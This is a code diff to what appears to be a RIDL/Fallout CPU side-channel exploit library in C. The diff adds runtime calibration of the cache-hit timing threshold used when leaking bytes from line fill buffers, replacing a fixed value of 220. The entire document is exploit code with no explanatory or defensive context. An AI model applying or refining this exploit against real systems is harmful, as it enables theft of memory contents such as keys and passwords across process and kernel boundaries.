@@ -23,6 +23,7 @@ int fallout_compatible() { return 0; }
 ssize_t page_size;
 jmp_buf buf;
 void *ptr = NULL;
+int cache_hit_timing = 150;
 
 #ifdef TSX_AVAILABLE
 static __attribute__((always_inline)) inline unsigned int xbegin(void) {
@@ -114,6 +115,15 @@ static void segfault_handler(int signum) {
     longjmp(buf, 1);
 }
 
+static inline int get_cache_timing() {
+    uint64_t * page = aligned_alloc(page_size, page_size);
+    page[0] = 42;
+    asm volatile("mfence");
+    int ret = (int) measure_access_time(page);
+    free(page);
+    return ret;
+}
+
 
 static inline int get_min(uint64_t *buffer, int len) {
     int min_i = 0, i = 0;
@@ -144,7 +154,7 @@ int lfb_read(void *mem) {
     lfb_leak(mem, ptr);
     for (; i < 256; i++) {
         uint64_t t = measure_access_time(mem + page_size * i);
-        if (t < 220) return i;
+        if (t < cache_hit_timing) return i;
     }
     return -1;
 }
@@ -162,7 +172,7 @@ int lfb_read(void *mem) {
     }
     for (; i < 256; i++) {
         uint64_t t = measure_access_time(mem + page_size * i);
-        if (t < 220) return i;
+        if (t < cache_hit_timing) return i;
     }
     return -1;
 }
@@ -181,6 +191,8 @@ int ridl_init() {
     }
 #endif
     page_size = getpagesize();
+    cache_hit_timing = get_cache_timing();
+    fflush(stdout);
     return 1;
 }
 
